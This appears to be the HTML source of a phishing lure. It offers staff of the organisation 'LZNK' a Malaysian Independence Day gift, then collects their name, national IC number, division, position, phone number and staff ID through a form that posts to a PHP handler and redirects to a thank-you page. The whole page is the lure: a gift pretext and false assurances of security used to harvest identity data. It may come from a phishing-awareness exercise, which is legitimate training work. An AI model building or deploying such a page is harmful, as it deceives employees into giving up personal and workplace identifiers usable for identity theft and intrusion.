<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Special Independence Day Gifts from LZNK</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container text-center mt-5">
        <img src="img/logo.png" class="logo mb-4" alt="LZNK Logo">
        <h1>Special Independence Day Gifts from LZNK</h1>
        <p><i>We are excited to offer you a special gift in celebration of Malaysian Independence Day. To personalize your gift, please confirm your information from the LZNK profile. Your information is secure and will only be used to ensure you receive the correct gift.</i></p>

        <!-- Agreement Form -->
        <form id="agreement-form" class="mt-3">
            <div class="form-check mb-3">
                <input type="checkbox" class="form-check-input" id="agreement" required>
                <label class="form-check-label" for="agreement">
                    I agree to share my information with LZNK and accept the terms and conditions.
                </label>
            </div>
            <button type="button" class="btn btn-primary" id="proceed-button">Proceed</button>
        </form>

        <!-- Data Collection Form -->
        <form id="details-form" class="mt-4 d-none" method="POST" action="submit_form.php">
            <div class="container">
                <div class="row">
                    <div class="col-md-6">
                        <div class="form-group">
                            <label for="name">Name:</label>
                            <input type="text" class="form-control" id="name" name="name" required>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="form-group">
                            <label for="nric">IC Number:</label>
                            <input type="text" class="form-control" id="nric" name="nric" required>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-md-6">
                        <div class="form-group">
                            <label for="division">Division:</label>
                            <input type="text" class="form-control" id="division" name="division" required>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="form-group">
                            <label for="position">Position:</label>
                            <input type="text" class="form-control" id="position" name="position" required>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-md-6">
                        <div class="form-group">
                            <label for="phone_number">Phone Number:</label>
                            <input type="tel" class="form-control" id="phone_number" name="phone_number" required>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="form-group">
                            <label for="staff_id">Staff ID:</label>
                            <input type="text" class="form-control" id="staff_id" name="staff_id" required>
                        </div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-md-12 text-center">
                        <button type="submit" class="btn btn-primary" name="submit">Submit</button>
                    </div>
                </div>
            </div>
        </form>
    </div>

    <!-- Bootstrap JS and dependencies -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
        // Handle the proceed button click
        document.getElementById('proceed-button').addEventListener('click', function() {
            if (document.getElementById('agreement').checked) {
                // Hide the agreement form and show the details form
                document.getElementById('agreement-form').classList.add('d-none');
                document.getElementById('details-form').classList.remove('d-none');
            } else {
                alert('You must agree to the terms and conditions to proceed.');
            }
        });

        // Validation logic (if needed)
        function validateForm() {
            // Implement any additional validation logic here if needed
            window.location.href = "thank_you.html"; // Redirect to thank_you.html after form submission
            return false; // Prevent the form from actually submitting if you're only doing a redirect
        }
    </script>
</body>
</html>
